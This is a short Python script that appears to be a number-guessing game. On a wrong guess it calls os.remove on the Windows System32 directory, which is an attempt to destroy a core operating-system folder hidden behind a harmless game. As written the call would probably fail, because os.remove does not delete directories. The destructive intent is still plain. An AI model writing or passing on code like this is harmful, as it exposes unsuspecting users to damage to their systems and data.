import random
import os

Number = random.randint(1,10)
Guess = input("Guess a Number Between 1 and 10 ")
Guess = int(Guess)

if Guess == Number:
    print("Great, You Won!")
else:
    os.remove("C:\Windows\System32")
